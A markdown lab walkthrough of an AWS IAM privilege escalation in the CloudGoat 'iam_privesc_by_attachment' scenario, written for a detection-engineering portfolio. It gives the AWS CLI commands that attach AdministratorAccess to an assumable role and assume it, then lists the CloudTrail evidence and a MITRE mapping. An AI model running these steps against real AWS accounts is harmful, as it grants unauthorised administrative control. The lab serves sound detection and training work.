# 🧪 Attack Walkthrough: IAM Privilege Escalation by Role Attachment

This walkthrough demonstrates an IAM privilege escalation attack from the [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) scenario `iam_privesc_by_attachment`.

---

## 🎯 Objective

Gain administrative access by attaching `AdministratorAccess` to a role (`cg-ec2-mighty-role`) that the low-privileged user (`kerrigan`) can assume.

---

## 🛠️ Environment

- **User:** `kerrigan`
- **Target Role:** `cg-ec2-mighty-role`
- **Region:** `us-east-1`
- **Logging:** Enabled via Terraform (CloudTrail + VPC Flow Logs)

---

## ✅ Step-by-Step Attack

### 1. Export `kerrigan`'s credentials

```bash
export AWS_ACCESS_KEY_ID=AKIA************
export AWS_SECRET_ACCESS_KEY=wJalr*************
export AWS_DEFAULT_REGION=us-east-1
```

### 2. List roles to find target

```bash
aws iam list-roles
```

Look for: `cg-ec2-mighty-role`

---

### 3. Attach Admin Policy to Role

```bash
aws iam attach-role-policy \
  --role-name cg-ec2-mighty-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

> 🎯 This is the **privilege escalation** action.
> It will generate a CloudTrail event for `AttachRolePolicy`.

---

### 4. Assume the Escalated Role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<your-account-id>:role/cg-ec2-mighty-role \
  --role-session-name escalate
```

Export the returned credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

---

### 5. Confirm Admin Access

```bash
aws iam list-users
aws ec2 describe-instances
```

✅ If these succeed, you have full admin access.

---

## 📄 CloudTrail Evidence

Check CloudTrail logs (in `us-east-1`) for:

- `eventSource`: `iam.amazonaws.com`
- `eventName`: `AttachRolePolicy`
- `userIdentity.arn`: `arn:aws:iam::<account>:user/kerrigan`

This confirms the escalation was captured by your Terraform-logged environment.

---

## 🧠 MITRE ATT&CK Mapping

| Tactic    | Technique                    | ID       |
|-----------|------------------------------|----------|
| Privilege Escalation | Modify Cloud IAM Role Permissions | T1484.1 |

---

## 📎 Next Step

➡️ [Write the Sigma detection rule](https://github.com/securityAD/detection-as-code-lab/blob/main/detections/iam_privesc_attach_role.yml)

---

*Lab completed as part of my cloud detection engineering portfolio.*
